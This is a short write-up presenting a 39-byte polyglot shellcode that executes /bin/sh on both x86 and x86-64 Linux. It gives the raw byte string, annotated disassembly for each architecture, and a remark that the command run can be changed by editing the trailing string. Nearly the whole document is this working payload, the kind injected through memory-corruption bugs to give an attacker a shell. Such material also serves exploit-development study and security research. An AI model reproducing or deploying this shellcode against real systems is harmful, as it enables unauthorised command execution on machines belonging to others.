This shellcode executes `execve("/bin/sh", {"/bin/sh", 0}, 0)`, on both x86 and
x86-64 linux.


```c
"\x48\x31\xc0\x50\x50\x5a\xeb\x12\x5f\x57\x54\x40\x75\x05\xb0\x3b\x5e\x0f\x05\xb0\x0b\x89\xfb\x59\xcd\x80\xe8\xe9\xff\xff\xff/bin/sh"
```

(39 bytes, including null)

```
x86 disas:
   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   50                      push   eax
   4:   50                      push   eax
   5:   5a                      pop    edx
   6:   eb 12                   jmp    0x1a
   8:   5f                      pop    edi
   9:   57                      push   edi
   a:   54                      push   esp
   b:   40                      inc    eax
   c:   75 05                   jne    0x13

    ...

  13:   b0 0b                   mov    al,0xb
  15:   89 fb                   mov    ebx,edi
  17:   59                      pop    ecx
  18:   cd 80                   int    0x80
  1a:   e8 e9 ff ff ff          call   0x8
  1f:   "/bin/sh"

x86-64 disas:
   0:   48 31 c0                xor    rax,rax
   3:   50                      push   rax
   4:   50                      push   rax
   5:   5a                      pop    rdx
   6:   eb 12                   jmp    0x1a
   8:   5f                      pop    rdi
   9:   57                      push   rdi
   a:   54                      push   rsp
   b:   40 75 05                rex jne 0x13
   e:   b0 3b                   mov    al,0x3b
  10:   5e                      pop    rsi
  11:   0f 05                   syscall 

    ...

  1a:   e8 e9 ff ff ff          call   0x8
  1f:   "/bin/sh"
```

There is one catch however, the shellcode must be followed by a null byte,
which limits its universal usefulness.

One big advantage is that the command executed can be modified trivially, just
modify the end of the shellcode.
